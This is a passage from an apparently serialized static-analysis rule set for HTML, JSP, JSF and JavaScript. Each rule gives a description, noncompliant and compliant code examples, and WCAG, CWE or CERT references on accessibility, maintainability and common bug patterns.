    &lt;th id="city"&gt;City&lt;/th&gt;                                &lt;!-- Compliant --&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;1.&lt;/td&gt;
    &lt;th id="person1" headers="name"&gt;Joel Garner&lt;/th&gt;       &lt;!-- Compliant --&gt;
    &lt;td headers="phone person1"&gt;412-212-5421&lt;/td&gt;
    &lt;td headers="city person1"&gt;Pittsburgh&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;2.&lt;/td&gt;
    &lt;th id="person2" headers="name"&gt;Clive Lloyd&lt;/th&gt;       &lt;!-- Compliant --&gt;
    &lt;td headers="phone person2"&gt;410-306-1420&lt;/td&gt;
    &lt;td headers="city person2"&gt;Baltimore&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
</pre>
<h2>See</h2>
<p> * <a href="https://www.w3.org/WAI/WCAG21/quickref/?versions=2.0#qr-content-structure-separation-programmatic">WCAG2, 1.3.1</a>&nbsp;-&nbsp;Info
and Relationships</p>
<ul>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/html.html#H43">WCAG2, H43</a> - Using id and headers attributes to associate data cells with header
  cells in data tables </li>
</ul>ZBUG
ù
Web:InlineStyleCheckÑ
WebInlineStyleCheck(The "style" attribute should not be used"MAJOR*web:®<p>The goal of this rule is to ban the usage of HTML "style" property to make sure that all CSS styles are defined in CSS classes. Consolidating all
styling into classes makes it easier to read, understand and maintain.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;body&gt;
  &lt;h1 style="color: blue;"&gt;Hello World!&lt;/h1&gt;  &lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;head&gt;
  &lt;style&gt;
    h1 {
      color: blue;
    }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Hello World!&lt;/h1&gt;
</pre>Z
CODE_SMELL
Õ
Web:ComplexityCheckµ
WebComplexityCheckFiles should not be too complex"MAJOR*web:„<p>Most of the time, a very complex file breaks the Single Responsibility Principle and should be re-factored into several different files.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
ô
Web:LongJavaScriptCheck˝
WebLongJavaScriptCheck<Javascript scriptlets should not have too many lines of code"MAJOR*web:ä<p>Long pieces of JavaScript should be located in dedicated *.js source files. This makes maintenance of both the script and the pages that use it
easier. Additionally, it offers some efficiencies in serving the files, since it takes better advantage of browser caching to only re-serve the parts
of a web page that have actually changed.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default parameter value of 5:</p>
<pre>
&lt;head&gt;
  ...
  &lt;script type="text/javascript" language="JavaScript"&gt;  &lt;!-- Noncompliant --&gt;
    function doTheThing(arg1) {
      ...
      ...
    }

    function doTheOtherThing(arg1) {
      ...
    }

    function andSoOn() {
      ...
    }
  &lt;/script&gt;
&lt;/head&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;head&gt;
  ...
  &lt;script type="text/javascript" language="JavaScript" src="myLongScript.js"&gt; &lt;/script&gt;
&lt;/head&gt;
</pre>Z
CODE_SMELL
„
	Web:S1829’
WebS1829*Web pages should not contain absolute URIs"MAJOR*web:Ç<p>It is considered best-practice to use relative URLs in web pages to prevent having to update the addresses if the web address in use changes.
Moreover, if some absolute URLs are missed in such a process, it will obviously impact the user experience. </p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;img src="http://www.myserver.com/smiley.gif" alt="Smiley face" height="42" width="42" /&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;img src="smiley.gif" alt="Smiley face" height="42" width="42" /&gt;
</pre>Z
CODE_SMELL
Û
Web:InputWithoutLabelCheck‘
WebInputWithoutLabelCheck7"input", "select" and "textarea" tags should be labeled"MAJOR*web:Í<p>The <code>&lt;label&gt;</code> tag defines a label for <code>&lt;input&gt;</code>, <code>&lt;select&gt;</code> and <code>&lt;textarea&gt;</code>
elements.</p>
<p>The <code>&lt;label&gt;</code> tag improves usability for visually impaired users: Screen readers will announce the label text whenever the focus
is set on the input field.</p>
<p>It also improves usability for users with impaired motor control: when the text within the <code>&lt;label&gt;</code> element is clicked, the
associated input field is toggled.</p>
<p>In most cases, <code>for</code> attribute of the <code>&lt;label&gt;</code> tag should be equal to the <code>id</code> attribute of the related
element to bind them together.</p>
<p>Sometimes the field is explained by an icon. In this case the label can be either hidden or the <code>&lt;input&gt;</code>,
<code>&lt;select&gt;</code> or <code>&lt;textarea&gt;</code> tags should contain one of the following attributes: <code>aria-label</code>,
<code>aria-labelledby</code>. Screen-readers will use those attributes to describe the field.</p>
<p>The purpose of this rule is to make sure that every <code>input</code> (except <code>submit</code>, <code>button</code>, <code>image</code>, and
<code>hidden</code> inputs), <code>select</code>, and <code>textarea</code> field has a label.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;input type="text" name="firstname" /&gt;               &lt;!-- Non-Compliant - no id --&gt;

&lt;input type="text" name="lastname" id="lastname" /&gt;  &lt;!-- Non-Compliant - no matching label for "lastname" --&gt;

&lt;label for="address"&gt;Address&lt;/label&gt;
&lt;input type="text" name="address" id="address" /&gt;    &lt;!-- Compliant --&gt;

&lt;input type="hidden" name="time" value="..."&gt;        &lt;!-- Compliant - "hidden" type is excluded --&gt;
&lt;input type="submit" value="Send" /&gt;                 &lt;!-- Compliant - "submit" type is excluded --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;label for="firstname"&gt;First name&lt;/label&gt;
&lt;input type="text" name="firstname" id="firstname" /&gt;

&lt;label for="lastname"&gt;Last name&lt;/label&gt;
&lt;input type="text" name="lastname" id="lastname" /&gt;

&lt;!-- OR --&gt;

&lt;input type="text" name="firstname" aria-label="firstname"&gt;

&lt;div id="lastNameId"&gt;Last name&lt;/div&gt;
&lt;input type="text" name="lastname"  aria-labelledby="lastNameId"/&gt;

&lt;!-- still compliant --&gt;

&lt;label for="address"&gt;Address&lt;/label&gt;
&lt;input type="text" name="address" id="address" /&gt;

&lt;input type="hidden" name="time" value="..."&gt;
&lt;input type="submit" value="Send" /&gt;
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised on "implicit labels", i.e. <code>&lt;label&gt;</code> tags enclosing an <code>&lt;input&gt;</code>,
<code>&lt;select&gt;</code> or <code>&lt;textarea&gt;</code> instead of being referencing via an&nbsp;<code>id</code>. However, note that the support
of this technic is not supported by all assistive technologies. Thus it is better to reference them by id.</p>
<pre>
&lt;label&gt;
  Name:
  &lt;input type="text" name="name"&gt;
&lt;/label&gt;
</pre>
<h2>See</h2>
<p> * <a href="https://www.w3.org/TR/WCAG20-TECHS/H44.html">WCAG2, H97</a> - Using label elements to associate text labels with form controls</p>
<p> * <a href="https://www.w3.org/WAI/tutorials/forms/labels/">W3C Web Accessibility Tutorials</a> - Labeling Controls</p>ZBUG
≤

,Web:LinksIdenticalTextsDifferentTargetsCheckÅ

Web(LinksIdenticalTextsDifferentTargetsCheck8Links with identical texts should have identical targets"MAJOR*web:˝<p>When links with different targets are given identical link text, this can produce confusion for users of assistive technologies, some of which
provide users the ability to view a list of all links on the page.</p>
<p>When this list of links is presented to the user they may be left not knowing the links go to different destinations.</p>
<p>Even if they do realize the links go to different destinations, they may be left not knowing which link to follow to go to the destination they
desire.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;a href="a.html"&gt;qux&lt;/a&gt;
&lt;a href="b.html"&gt;qux&lt;/a&gt;          &lt;!-- Noncompliant; same text, different targets --&gt;

&lt;a href="c.html"&gt;foo&lt;/a&gt;
&lt;a href="d.html"&gt;foo&lt;/a&gt;          &lt;!-- Noncompliant; same text, different targets --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;a href="a.html"&gt;qux&lt;/a&gt;
&lt;a href="b.html"&gt;qaz&lt;/a&gt;          &lt;!-- Compliant; different text, different targets --&gt;

&lt;a href="c.html"&gt;foo&lt;/a&gt;
&lt;a href="c.html"&gt;foo&lt;/a&gt;          &lt;!-- Compliant; same text, same targets --&gt;
</pre>Z
CODE_SMELL
â
 Web:ImgWithoutWidthOrHeightCheck‰
WebImgWithoutWidthOrHeightCheck6Image tags should have "width" and "height" attributes"MAJOR*web:ı<p>If the <code>width</code> and <code>height</code> attributes are set, the space required for the image is reserved immediately by the browser, even
before it actually starts to load the image.</p>
<p>Without those attributes, the page layout constantly changes as images are loaded until they are all loaded, which can disorient users.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;img src="logo.png" alt="My Company" /&gt;                           &lt;!-- Non-Compliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;img src="logo.png" alt="My Company" width="100" height="50" /&gt;   &lt;!-- Compliant --&gt;
</pre>ZBUG
ˆ
Web:JspScriptletCheck‹
WebJspScriptletCheck"JSP expressions should not be used"MAJOR*web:Ö<p>JSP expressions (using <code>&lt;%= ... %&gt;</code>) have been deprecated because they:</p>
<ul>
  <li> Are not unit testable. </li>
  <li> Are not reusable. </li>
  <li> Cannot make use of object oriented concepts such as inheritence. </li>
  <li> Have poor error handling capabilities: if an exception is thrown, an empty page is rended. </li>
  <li> Mix the business and presentation logic. </li>
</ul>
<p>JSP Standard Tag Library (JSTL) and Expression Language should be used instead, enabiling the adoption of the model-view-controller (MVC) design
pattern which reduces the coupling between the presentation tier and the business logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;input type="text" name="foo" value="&lt;%= request.getParameter("foo") %&gt;" /&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;input type="text" name="foo" value="${fn:escapeXml(param.foo)}" /&gt;
</pre>Z
CODE_SMELL
·
Web:IllegalAttributeCheck√
WebIllegalAttributeCheck#Track uses of disallowed attributes"MAJOR*web:Â<p>This rule checks that the specified attributes are not present in HTML tags.</p>
<h2>Noncompliant Code Example</h2>
<p>For a disallowed attribute list of: <code>a.name</code>:</p>
<pre>
&lt;a href="blah.com" name="Blah link"&gt; &lt;!-- Noncompliant; name attribute is used --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;a href="blah.com"&gt;
</pre>@Z
CODE_SMELL
ü
Web:LinkToImageCheckÜ
WebLinkToImageCheck'Links should not directly target images"MAJOR*web:´<p>Whenever a user clicks on a link that targets an image, the website's navigation menu will be lost.</p>
<p>From a user point of view, it is as if she left the website.</p>
<p>The only way to return to it is using the browser's 'Back' button.</p>
<p>Instead, it is better to create a page which will display the image using the <code>&lt;img&gt;</code> tag and preserve the navigation menu.</p>
<p>Further, in terms of accessibility, when the image is embedded into a page, content providers are able to provide an alternate text equivalent
through the <code>alt</code> attribute.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;a href="image.png"&gt;...&lt;/a&gt;  &lt;!-- Non-Compliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;a href="page.html"&gt;...&lt;/a&gt;  &lt;!-- Compliant --&gt;
</pre>Z
CODE_SMELL
ï
Web:PageWithoutFaviconCheckı
WebPageWithoutFaviconCheck$Favicons should be used in all pages"MAJOR*web:ñ<p>Favicons are shown for example in the browser's address bar, bookmark list, or tabs.</p>
<p>They enable users to quickly identify and recognize websites.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;head&gt;                                                                  &lt;!-- Noncompliant --&gt;
  &lt;title&gt;...&lt;title&gt;
&lt;/head&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;head&gt;
  &lt;title&gt;...&lt;title&gt;
  &lt;link rel="shortcut icon" href="http://example.com/myicon.ico" /&gt;
&lt;/head&gt;
</pre>Z
CODE_SMELL
å
Web:InternationalizationCheckÍ

WebInternationalizationCheck/Labels should be defined in the resource bundle"MAJOR*web:Ö
<p>Web applications can be made available in multiple languages through the use of internationalization. This allows the server to plug in the correct
version of a piece of text based on the language chosen, but it requires that internationalization messages be used instead of hard-coded text.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  &lt;form method="post"&gt;
    &lt;label for="username"&gt;Username:&lt;/label&gt;  &lt;!-- Noncompliant --&gt;
    &lt;input type="text" id="username" name="username"&gt;
    &lt;br&gt;
    &lt;label for="password"&gt;Password:&lt;/label&gt;  &lt;!-- Noncompliant --&gt;
    &lt;input type="password" id="password" name="password"&gt;
    &lt;br&gt;
    &lt;input type="submit" name="submit" value="${buttonValue}"&gt;
  &lt;/form&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
  &lt;form method="post"&gt;
    &lt;label for="username"&gt;&lt;fmt:message key="login.label.username" /&gt;:&lt;/label&gt;
    &lt;input type="text" id="username" name="username"&gt;
    &lt;br&gt;
    &lt;label for="password"&gt;&lt;fmt:message key="login.label.password" /&gt;:&lt;/label&gt;
    &lt;input type="password" id="password" name="password"&gt;
    &lt;br&gt;
    &lt;input type="submit" name="submit" value="${buttonValue}"&gt;
  &lt;/form&gt;
</pre>ZBUG
¥
Web:UnifiedExpressionCheckï
WebUnifiedExpressionCheck-JSF expressions should be syntactically valid"MAJOR*web:µ<p>This rule allows to make sure that all JSF Expressions are syntactically correct.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"
   xmlns:h="http://java.sun.com/jsf/html"&gt;
   &lt;h:body&gt;
     First name
     &lt;h:outputText value="#{user.firstName &amp;&amp; @@}"/&gt;   &lt;!-- Noncompliant --&gt;
   &lt;/h:body&gt;
&lt;/html&gt;
</pre>ZBUG
í

javascript:S2589˝	

javascriptS2589,Boolean expressions should not be gratuitous"MAJOR*js:¢	<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (a) {
  if (a) { // Noncompliant
    doSomething();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a) {
  if (b) {
    doSomething();
  }
}

// or
if (a) {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>Z
CODE_SMELL
ê
javascript:S3798˚

javascriptS3798BVariables and functions should not be declared in the global scope"MAJOR*js:ä<p>Any variable or function declared in the global scope implicitly becomes attached to the global object (the <code>window</code> object in a browser
environment). To make it explicit this variable or function should be a property of <code>window</code>. When it is meant to be used just locally, it
should be declared with the <code>const</code> or <code>let</code> keywords (since ECMAScript 2015) or within an Immediately-Invoked Function
Expression (IIFE).</p>
<p>This rule should not be activated when modules are used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var myVar = 42;       // Noncompliant
function myFunc() { } // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
window.myVar = 42;
window.myFunc = function() { };
</pre>
<p>or</p>
<pre>
let myVar = 42;
let myFunc = function() { }
</pre>
<p>or </p>
<pre>
// IIFE
(function() {
  var myVar = 42;
  function myFunc() { }
})();
</pre>Z
CODE_SMELL
è
javascript:S3799˙

javascriptS3799*Destructuring patterns should not be empty"MAJOR*js:®<p>Destructuring is a convenient way of extracting multiple values from data stored in (possibly nested) objects and arrays. However, it is possible
to create an empty pattern that has no effect. When empty curly braces or brackets are used to the right of a property name most of the time the
intent was to use a default value instead.</p>
<p>This rule raises an issue when empty destructuring pattern is used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var {a: {}, b} = myObj; // Noncompliant
function foo({first: [], second}) { // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var {a = {}, b} = myObj;
function foo({first = [], second}) {
  // ...
}
</pre>ZBUG
·
javascript:S1134Ã

javascriptS1134Track uses of "FIXME" tags"MAJOR*js:É<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function divide(numerator, denominator) {
  return numerator / denominator;              // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
”
)javascript:BoundOrAssignedEvalOrArguments•

javascriptBoundOrAssignedEvalOrArguments6"eval" and "arguments" should not be bound or assigned"MAJOR*js:Æ<p><code>eval</code> is used to evaluate a string as JavaScript code, and <code>arguments</code> is used to access function arguments through indexed
properties. As a consequence, <code>eval</code> and <code>arguments</code> should not be bound or assigned, because doing so would overwrite the
original definitions of those two reserved words.</p>
<p>What's more, using either of those two names to assign or bind will generate an error in JavaScript strict mode code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
eval = 17; // Noncompliant
arguments++; // Noncompliant
++eval; // Noncompliant
var obj = { set p(arguments) { } }; // Noncompliant
var eval; // Noncompliant
try { } catch (arguments) { } // Noncompliant
function x(eval) { } // Noncompliant
function arguments() { } // Noncompliant
var y = function eval() { }; // Noncompliant
var f = new Function("arguments", "return 17;"); // Noncompliant

function fun() {
  if (arguments.length == 0) { // Compliant
    // do something
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
result = 17;
args++;
++result;
var obj = { set p(arg) { } };
var result;
try { } catch (args) { }
function x(arg) { }
function args() { }
var y = function fun() { };
var f = new Function("args", "return 17;");

function fun() {
  if (arguments.length == 0) {
    // do something
  }
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS2137'>S2137</a> instead.</p>ZBUG
Ü
javascript:S2583Ò


javascriptS25831Conditionally executed blocks should be reachable"MAJOR*js:ò
<p>Conditional expressions which are always <code>true</code> or <code>false</code> can lead to dead code. Such code is always buggy and should never
be used in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = false;
if (a) { // Noncompliant
  doSomething(); // never executed
}

if (!a || b) { // Noncompliant; "!a" is always "true", "b" is never evaluated
  doSomething();
} else {
  doSomethingElse(); // never executed
}
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue in either of these cases:</p>
<ul>
  <li> When the condition is a single <code>const</code> of boolean value </li>
</ul>
<pre>
const debug = false;
//...
if (debug) {
  // Print something
}
</pre>
<ul>
  <li> When the condition is the literal <code>0</code>, <code>1</code>, <code>true</code> or <code>false</code>. </li>
</ul>
<p>In these cases it is obvious the code is as intended.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
…
javascript:S2234¥

javascriptS22340Parameters should be passed in the correct order"MAJOR*js:’<p>When the names of arguments in a function call match the names of the function parameters, it contributes to clearer, more readable code. However,
when the names match, but are passed in a different order than the function parameters, it indicates a mistake in the parameter order which will
likely lead to unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function divide(divisor, dividend) {
  return divisor/dividend;
}

function doTheThing() {
  var divisor = 15;
  var dividend = 5;

  var result = divide(dividend, divisor);  // Noncompliant; operation succeeds, but result is unexpected
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function divide(divisor, dividend) {
  return divisor/dividend;
}

function doTheThing() {
  var divisor = 15;
  var dividend = 5;

  var result = divide(divisor, dividend);
  //...
}
</pre>Z
CODE_SMELL
›
javascript:S3686»

javascriptS3686:Functions should not be called both with and without "new""MAJOR*js:ﬂ<p>Constructor functions, which create new object instances, must only be called with <code>new</code>. Non-constructor functions must not. Mixing
these two usages could lead to unexpected results at runtime.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function getNum() {
  return 5;
}

function Num(numeric, alphabetic) {
  this.numeric = numeric;
  this.alphabetic = alphabetic;
}

var myFirstNum = getNum();
var my2ndNum = new getNum();  // Noncompliant. An empty object is returned, NOT 5

var myNumObj1 = new Num();
var myNumObj2 = Num();  // Noncompliant. undefined is returned, NOT an object
</pre>Z
CODE_SMELL
•
javascript:S1145ê

javascriptS1145FUseless "if(true) {...}" and "if(false){...}" blocks should be removed"MAJOR*js:¢<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (true) {  // Noncompliant
  doSomething();
}
...
if (false) {  // Noncompliant
  doSomethingElse();
}

if (!options || options === true) { doThirdThing(); }  // Noncompliant; always true
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething();

doThirdThing();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS2583'>S2583</a> instead.</p>ZBUG
˙

 javascript:DuplicatePropertyName’


javascriptDuplicatePropertyNameHProperty names should not be duplicated within a class or object literal"MAJOR*js:’	<p>JavaScript allows duplicate property names in classes and object literals, but only the last instance of a duplicated name determines the actual
value that will be used for it. Therefore, changing values of other occurrences of a duplicated name will have no effect and may cause
misunderstandings and bugs.</p>
<p>Defining a <code>class</code> with a duplicated <code>constructor</code> will generate an error.</p>
<p>Before ECMAScript 2015, using duplicate names will generate an error in JavaScript strict mode code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var data = {
  "key": "value",
  "1": "value",
  "key": "value", // Noncompliant - duplicate of "key"
  'key': "value", // Noncompliant - duplicate of "key"
  key: "value", // Noncompliant - duplicate of "key"
  \u006bey: "value", // Noncompliant - duplicate of "key"
  "\u006bey": "value", // Noncompliant - duplicate of "key"
  "\x6bey": "value", // Noncompliant - duplicate of "key"
  1: "value" // Noncompliant - duplicate of "1"
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var data = {
  "key": "value",
  "1": "value",
  "key2": "value",
  'key3': "value",
  key4: "value",
  \u006bey5: "value",
  "\u006bey6": "value",
  "\x6bey7": "value",
  1b: "value"
}
</pre>ZBUG
˙

javascript:S881Ê


javascriptS881~Increment (++) and decrement (--) operators should not be used in a method call or mixed with other operators in an expression"MAJOR*js:∫	<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>
<ul>
  <li> It can significantly impair the readability of the code. </li>
  <li> It introduces additional side effects into a statement, with the potential for undefined behavior. </li>
  <li> It is safer to use these operators in isolation from any other arithmetic operators. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
u8a = ++u8b + u8c--;
foo = bar++ / 4;
</pre>
<h2>Compliant Solution</h2>
<p>The following sequence is clearer and therefore safer:</p>
<pre>
++u8b;
u8a = u8b + u8c;
u8c--;
foo = bar / 4;
bar++;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwE">CERT, EXP30-C.</a> - Do not depend on the order of evaluation for side effects
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/fYAyAQ">CERT, EXP50-CPP.</a> - Do not depend on the order of evaluation for side
  effects </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/yQC7AQ">CERT, EXP05-J.</a> - Do not follow a write by a subsequent write or read of the
  same object within an expression </li>
</ul>Z
CODE_SMELL
‚
javascript:S2201Õ

javascriptS2201GReturn values from functions without side effects should not be ignored"MAJOR*js:ﬁ<p>When the call to a function doesn't have any side effects, what is the point of making the call if the results are ignored? In such case, either
the function call is useless and should be dropped or the source code doesn't behave as expected. </p>
<p>To prevent generating any false-positives, this rule triggers an issues only on a predefined list of known objects &amp; functions. </p>
<h2>Noncompliant Code Example</h2>
<pre>
'hello'.lastIndexOf('e'); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
let char = 'hello'.lastIndexOf('e');
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9YIRAQ">CERT, EXP12-C.</a> - Do not ignore values returned by functions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9gEqAQ">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>
</ul>ZBUG
™	
javascript:S2688ï	

javascriptS2688'"NaN" should not be used in comparisons"MAJOR*js:∆<p><code>NaN</code> is not equal to anything, even itself. Testing for equality or inequality against <code>NaN</code> will yield predictable results,
but probably not the ones you want. </p>
<p>Instead, the best way to see whether a variable is equal to <code>NaN</code> is to use <code>Number.isNaN()</code>, since ES2015, or (perhaps
counter-intuitively) to compare it to itself. Since <code>NaN !== NaN</code>, when <code>a !== a</code>, you know it must equal <code>NaN</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var a = NaN;

if (a === NaN) {  // Noncompliant; always false
  console.log("a is not a number");  // this is dead code
}
if (a !== NaN) { // Noncompliant; always true
  console.log("a is not NaN"); // this statement is not necessarily true
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (Number.isNaN(a)) {
  console.log("a is not a number");
}
if (!Number.isNaN(a)) {
  console.log("a is not NaN");
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7AEqAQ">CERT, NUM07-J.</a> - Do not attempt comparisons with NaN </li>
</ul>ZBUG
∫
javascript:S878¶

javascriptS878!Comma operator should not be used"MAJOR*js:◊<p>The comma operator takes two expressions, executes them from left to right and returns the result of the second one. Use of this operator is
generally detrimental to the readability and reliability of code, and the same effect can be achieved by other means.</p>
<h2>Noncompliant Code Example</h2>
<pre>
i = a += 2, a + b;  // What's the value of i ?
</pre>
<h2>Compliant Solution</h2>
<pre>
a +=  2;
i = a + b;
</pre>
<h2>Exceptions</h2>
<p>Use of comma operator is tolerated:</p>
<ul>
  <li> in initialization and increment expressions of <code>for</code> loops. </li>
</ul>
<pre>
for(i = 0, j = 5; i &lt; 6; i++, j++) { ... }
</pre>
<ul>
  <li> If the expression sequence is explicitly wrapped in parentheses. </li>
</ul>Z
CODE_SMELL
…
javascript:S2685¥

javascriptS2685<"arguments.caller" and "arguments.callee" should not be used"MAJOR*js:…<p>Both <code>arguments.caller</code> and <code>arguments.callee</code> make quite a few optimizations impossible so they were deprecated in latest
versions of JavaScript. In fact, EcmaScript 5 forbids the use of both in <code>strict</code> mode, according to the docs:</p>
<blockquote>
  Arguments objects for strict mode functions define non-configurable accessor properties named "caller" and "callee" which throw a TypeError
  exception on access.
</blockquote>
<p>The same restriction applies to the function's <code>caller</code> and <code>arguments</code> properties in <code>strict</code> mode.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function whoCalled() {
   if (arguments.caller == null)   //Noncompliant
      console.log('I was called from the global scope.');
   else
      console.log(arguments.caller + ' called me!');  // Noncompliant

  console.log(whoCalled.caller);  // Noncompliant
  console.log(whoCalled.arguments);  // Noncompliant
}
</pre>Z
CODE_SMELL
¢
javascript:S4624ç

javascriptS4624&Template literals should not be nested"MAJOR*js:∏<p>Template literals (previously named "template strings") are an elegant way to build a string without using the <code>+</code> operator to make
strings concatenation more readable. </p>
<p>However, it's possible to build complex string literals by nesting together multiple template literals, and therefore lose readability and
maintainability.</p>
<p>In such situations, it's preferable to move the nested template into a separate statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let color = "red";
let count = 3;
let message = `I have ${color ? `${count} ${color}` : count} apples`; // Noncompliant; nested template strings not easy to read
</pre>
<h2>Compliant Solution</h2>
<pre>
let color = "red";
let count = 3;
let apples = color ? `${count} ${color}` : count;
let message = `I have ${apples} apples`;
</pre>Z
CODE_SMELL
ª
javascript:S1110¶

javascriptS11100Redundant pairs of parentheses should be removed"MAJOR*js:«<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
let x = (y / 2 + 1);   //Compliant even if those parenthesis are useless for the compiler

if (a &amp;&amp; ((x+y &gt; 0))) {  // Noncompliant
  //...
}

return ((x + 1));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
let x = (y / 2 + 1);

if (a &amp;&amp; (x+y &gt; 0)) {
  //...
}

return (x + 1);
</pre>Z
CODE_SMELL
á
javascript:S2681Ú

